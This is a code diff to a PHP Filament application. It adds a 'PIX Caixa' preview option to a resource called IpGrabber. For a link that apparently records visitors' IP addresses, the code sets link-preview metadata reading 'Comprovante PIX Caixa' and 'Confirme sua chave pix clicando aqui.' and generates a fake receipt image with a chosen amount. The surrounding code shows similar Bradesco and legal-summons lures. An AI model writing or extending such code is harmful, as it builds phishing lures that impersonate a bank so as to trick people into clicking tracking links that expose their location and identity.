@@ -6,6 +6,7 @@ use App\Filament\Resources\PixelTracks\IpGrabberResource;
 use App\Models\IpGrabber;
 use App\Services\Pixel\IntimacaoPreviewService;
 use App\Services\Pixel\NewsPreviewMetadataService;
+use App\Services\Pixel\PixCaixaImagemService;
 use App\Services\Pixel\PixImagemService;
 use Filament\Notifications\Notification;
 use Filament\Resources\Pages\CreateRecord;
@@ -79,6 +80,22 @@ class CreateIpGrabber extends CreateRecord
             }
 
             $data = array_merge($data, $this->ogGerado);
+        }
+
+        if (($data['preview_tipo'] ?? null) === 'pix_caixa') {
+            $valor = trim((string) ($data['pix_caixa_valor'] ?? ''));
+            unset($data['pix_caixa_valor']);
+
+            $data['og_titulo']   = 'Comprovante PIX Caixa';
+            $data['og_descricao'] = 'Confirme sua chave pix clicando aqui.';
+
+            if ($valor !== '') {
+                $pathGerado = app(PixCaixaImagemService::class)->gerar($valor, $data['token']);
+                if ($pathGerado) {
+                    $this->ogGerado = ['og_imagem_upload' => $pathGerado, 'og_imagem' => null];
+                    $data = array_merge($data, $this->ogGerado);
+                }
+            }
         }
 
         if (($data['preview_tipo'] ?? null) === 'pix_bradesco') {
